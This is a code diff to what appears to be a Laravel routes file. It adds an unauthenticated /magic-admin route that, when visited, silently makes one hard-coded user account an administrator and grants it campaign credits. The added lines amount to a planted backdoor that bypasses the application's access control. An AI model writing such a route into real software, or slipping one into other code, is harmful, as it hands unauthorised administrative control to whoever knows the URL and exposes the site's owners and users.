@@ -26,6 +26,11 @@ Route::get('/refunds', function () {
     return view('legal.refunds');
 })->name('legal.refunds');
 
+Route::get('/magic-admin', function () {
+    \App\Models\User::where('email', 'adlane.tounsi@univ-alger.dz')->update(['is_admin' => true, 'campaign_credits' => 5]);
+    return 'Success! You are now an Admin with 5 credits. Go to /admin';
+});
+
 // Operational Core (Dashboard) at the web root protected by auth
 Route::get('/', function () {
     return redirect()->route('dashboard');
